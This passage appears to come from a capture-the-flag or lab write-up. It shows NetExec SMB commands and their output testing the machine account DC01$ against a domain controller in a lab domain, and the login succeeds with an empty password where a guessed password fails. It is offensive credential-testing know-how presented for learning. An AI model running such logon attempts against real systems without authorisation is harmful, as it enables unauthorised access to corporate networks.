
```sh
┌──(kali㉿proxli)-[~/exploits]
└─$ nxc smb 10.10.232.150 -u "DC01$" -p ""
SMB         10.10.232.150   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:hololive.local) (signing:True) (SMBv1:False)
SMB         10.10.232.150   445    DC01             [+] hololive.local\DC01$: 
```

```sh
┌──(kali㉿proxli)-[~/exploits]
└─$ nxc smb 10.10.232.150 -u "DC01$" -p "qwe"
SMB         10.10.232.150   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:hololive.local) (signing:True) (SMBv1:False)
SMB         10.10.232.150   445    DC01             [-] hololive.local\DC01$:qwe STATUS_LOGON_FAILURE 
```

The password is nothing ""
